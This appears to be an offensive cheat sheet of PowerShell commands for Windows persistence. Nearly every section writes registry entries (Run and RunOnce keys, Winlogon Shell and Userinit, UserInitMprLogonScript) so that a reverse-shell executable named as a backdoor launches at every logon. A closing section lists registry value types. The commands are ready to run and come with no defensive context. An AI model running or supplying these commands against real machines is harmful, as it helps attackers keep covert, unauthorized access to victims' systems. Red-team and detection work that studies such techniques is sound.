### Modify logon script for entire machine
```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
```

### Modify logon script for current user
```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
```

### Modify Shell of Winlogon
```powershell
$currentValue = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").Shell
$newValue = "$currentValue, c:\windows\revshell.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value $newValue
```

### Modify Userinit of Winlogon
```powershell
$currentValue = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").Userinit
$newValue = "$currentValue c:\windows\revshell.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value $newValue
```

### Another way to modify Userinit/Shell of Winlogon
```powershell
$keyPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty -Path $keyPath | ForEach-Object {
    Set-ItemProperty -Path $keyPath -Name "Userinit" -Value "$($_.Userinit) c:\windows\revshell.exe"
    Set-ItemProperty -Path $keyPath -Name "Shell" -Value "$($_.Shell), c:\windows\revshell.exe"

}
```

### Modify environmental variable for logon script
```powershell
New-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
```

### Examples of Value Types  
```powershell
# String (REG_SZ)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value "StringValue" -PropertyType "String"

# ExpandString (REG_EXPAND_SZ)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value "%SystemRoot%\System32" -PropertyType "ExpandString"

# Binary (REG_BINARY)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value ([byte[]](65,66,67,68)) -PropertyType "Binary"

# DWord (REG_DWORD)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 1234 -PropertyType "DWord"

# MultiString (REG_MULTI_SZ)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value @("String1","String2") -PropertyType "MultiString"

# QWord (REG_QWORD)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 123456789012345 -PropertyType "QWord"

# Unknown (REG_NONE)
New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 0 -PropertyType "Unknown"
```